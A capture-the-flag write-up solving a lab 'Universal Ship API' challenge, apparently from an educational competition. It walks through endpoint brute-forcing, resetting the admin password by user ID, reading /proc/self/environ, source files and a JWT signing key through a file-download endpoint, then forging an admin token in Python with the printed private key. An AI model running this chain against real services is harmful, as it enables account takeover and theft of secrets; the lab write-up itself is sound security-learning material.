#### Challenge:

Ahoy, officer,

on our last port visit, a new U.S.A. (Universal Ship API) interface was installed on the ship. In order to unlock new experimental ship functions, the special code has to be entered into ship FLAG (First Layer Application Gateway). Your task is to get this FLAG code from U.S.A.

May you have fair winds and following seas!

The U.S.A. is available at <a href="http://universal-ship-api.cns-jv.tcc" target="_blank">http:&#47;&#47;universal-ship-api.cns-jv.tcc</a>.

---

#### Solution:

- playing with the API reveals that there are few endpoints however for some of them we need token, `nikto` didn't find anything useful

```
http://universal-ship-api.cns-jv.tcc/docs
http://universal-ship-api.cns-jv.tcc/api/v1/admin
http://universal-ship-api.cns-jv.tcc/api/v1/user
```

- after digging for some time I came across [writeup](https://0xdf.gitlab.io/2022/05/02/htb-backendtwo.html) which seems to be inspiration for this challenge... based on it instead of `nikto` `feroxbuster` is used and that reveals 2 additional endpoints

```bash
feroxbuster -u http://universal-ship-api.cns-jv.tcc/ --force-recursion -C 404,405 -m GET,POST --random-agent
feroxbuster -u http://universal-ship-api.cns-jv.tcc/api/v1/user --force-recursion -C 404,405 -m GET,POST --random-agent
> http://universal-ship-api.cns-jv.tcc/api/v1/user/signup
> http://universal-ship-api.cns-jv.tcc/api/v1/user/login

curl -X POST   -v http://universal-ship-api.cns-jv.tcc/api/v1/user/signup -d '{"email": "magic", "password": "0xdf0xdf"}' -H "Content-Type: application/json"
curl -X POST   -v http://universal-ship-api.cns-jv.tcc/api/v1/user/login -d 'username=magic&password=0xdf0xdf'
```

- now we can craft our own user and look into the `swagger` where we find couple of new endpoints:
  - `updatepassword` with just the user `uuid` we can alter password
  - `admin/file` can download any file on FS
  - `admin/getFlag` get the final flag

- updating the `admin` password is pretty easy as we can list it's `uuid` without admin token

```bash
curl http://universal-ship-api.cns-jv.tcc/api/v1/user/1 \
  -H "Authorization: Bearer ..."  \

curl -X 'POST' \
  'http://universal-ship-api.cns-jv.tcc/api/v1/user/updatepassword' \
  -H "Authorization: Bearer ..."  \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "guid": "f2abcb5c-7060-4ba8-bf76-0447ba79fbb4",
  "password": "0xdf0xdf"
}'
curl -X POST   -v http://universal-ship-api.cns-jv.tcc/api/v1/user/login -d 'username=admin@local.tcc&password=0xdf0xdf'
```

- unfortunately with the admin token `getFlag` endpoint is still not working as it requires custom `jwt` property, so we need to craft our own token and for that we'll reverse the application and leak all the keys via `admin/file` endpoint

```bash
curl -X POST http://universal-ship-api.cns-jv.tcc/api/v1/admin/file -H "Authorization: Bearer ..." -H 'Content-Type: application/json'   -d '{ "file": "/proc/self/environ" }' | jq -r .file
curl -X POST http://universal-ship-api.cns-jv.tcc/api/v1/admin/file -H "Authorization: Bearer ..." -H 'Content-Type: application/json'   -d '{ "file": "/app/shipapi/main.py" }' | jq -r .file
curl -X POST http://universal-ship-api.cns-jv.tcc/api/v1/admin/file -H "Authorization: Bearer ..." -H 'Content-Type: application/json'   -d '{ "file": "/app/shipapi/appconfig/config.py" }' | jq -r .file
curl -X POST http://universal-ship-api.cns-jv.tcc/api/v1/admin/file -H "Authorization: Bearer ..." -H 'Content-Type: application/json'   -d '{ "file": "shipapi/appconfig/jwtsigning.key" }' | jq -r .file
curl -X POST http://universal-ship-api.cns-jv.tcc/api/v1/admin/file -H "Authorization: Bearer ..." -H 'Content-Type: application/json'   -d '{ "file": "shipapi/appconfig/jwtsigning.pub" }' | jq -r .file
curl -X POST http://universal-ship-api.cns-jv.tcc/api/v1/admin/file -H "Authorization: Bearer ..." -H 'Content-Type: application/json'   -d '{ "file": "/app/shipapi/core/auth.py" }' | jq -r .file
```

- generate custom `jwt` token with `flag-read` property

```python
from datetime import datetime, timedelta
import jwt

payload = {}
payload["type"] = "access_token"
payload["exp"] = datetime.utcnow() + 60 * 24 * 8
payload["iat"] = datetime.utcnow()
payload["sub"] = str(1)
payload["admin"] = bool(True)
payload["flag-read"] = bool(True)
payload["guid"] = str("f2abcb5c-7060-4ba8-bf76-0447ba79fbb4")

JWT_RSA_KEY = "-----BEGIN RSA PRIVATE KEY-----\n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\n-----END RSA PRIVATE KEY-----\n"
ALGORITHM: str = "RS384"

jwt.encode(payload, JWT_RSA_KEY, algorithm=ALGORITHM)
```

- all that remains is get the flag with our crafted token

```bash
curl -X POST http://universal-ship-api.cns-jv.tcc/api/v1/admin/getFlag H "Authorization: Bearer ..."`
```
---

<details><summary>FLAG:</summary>

```
FLAG{910P-iUeJ-Wwq1-i8L2}
```

</details>
<br/>
